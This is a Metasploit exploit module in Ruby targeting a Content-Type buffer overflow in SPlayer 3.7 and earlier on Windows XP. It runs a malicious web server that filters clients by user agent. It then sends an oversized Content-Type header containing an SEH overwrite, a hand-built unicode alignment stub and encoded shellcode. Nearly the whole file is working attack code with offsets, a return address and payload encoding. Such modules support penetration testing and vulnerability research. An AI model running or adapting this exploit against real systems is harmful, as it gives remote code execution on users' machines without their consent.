##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info={})
    super(update_info(info,
      'Name'           => "SPlayer 3.7 Content-Type Buffer Overflow",
      'Description'    => %q{
          This module exploits a vulnerability in SPlayer v3.7 or piror.  When SPlayer
        requests the URL of a media file (video or audio), it is possible to gain arbitrary
        remote code execution due to a buffer overflow caused by an exceeding length of data
        as the 'Content-Type' parameter.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'xsploitedsec <xsploitedsecurity[at]gmail.com>',  #Initial discovery, PoC
          'sinn3r', #Metasploit
        ],
      'References'     =>
        [
          ['OSVDB', '72181'],
          ['EDB', '17243'],
        ],
      'Payload'        =>
        {
          'BadChars'        => "\x00\x0a\x0d\x80\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f",
          'StackAdjustment' => -3500,
          'EncoderType'     => Msf::Encoder::Type::AlphanumMixed,
          'BufferRegister'  => 'ECX',
        },
      'DefaultOptions'  =>
        {
          'EXITFUNC'         => "seh",
          'InitialAutoRunScript' => 'migrate -f',
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [
            'Windows XP SP2/XP3',
            {
              'Offset' => 2073,    #Offset to SEH
              'Ret'    => 0x7325,  #Unicode P/P/R (splayer.exe)
              'Max'    => 30000,   #Max buffer size
            }
          ],
        ],
      'Privileged'     => false,
      'DisclosureDate' => "May 4 2011",
      'DefaultTarget'  => 0))
  end

  def get_unicode_payload(p)
    encoder = framework.encoders.create("x86/unicode_mixed")
    encoder.datastore.import_options_from_hash( {'BufferRegister'=>'EAX'} )
    unicode_payload = encoder.encode(p, nil, nil, platform)
    return unicode_payload
  end

  def on_request_uri(cli, request)

    agent = request.headers['User-Agent']
    if agent !~ /Media Player Classic/
      send_not_found(cli)
      print_error("Unknown user-agent")
      return
    end

    nop = "\x73"

    #MOV EAX,EDI; XOR AL,C3; INC EAX; XOR AL,79; PUSH EAX; POP ECX; JMP SHORT 0x40
    alignment = "\x8b\xc7\x34\xc3\x40\x34\x79\x50\x59\xeb\x40"
    padding = nop*6
    p = get_unicode_payload(alignment + padding + payload.encoded)

    sploit = rand_text_alpha(2073)
    sploit << "\x61\x73"
    sploit << "\x25\x73"
    sploit << nop
    sploit << "\x55"
    sploit << nop
    sploit << "\x58"
    sploit << nop
    sploit << "\x05\x19\x11"
    sploit << nop
    sploit << "\x2d\x11\x11"
    sploit << nop
    sploit << "\x50"
    sploit << nop
    sploit << "\x50"
    sploit << nop
    sploit << "\x5f"
    sploit << nop
    sploit << "\xc3"
    sploit << rand_text_alpha(1000)
    sploit << p
    sploit << rand_text_alpha(target['Max']-sploit.length)

    print_status("Sending malicious content-type")
    send_response(cli, '', {'Content-Type'=>sploit})

  end

end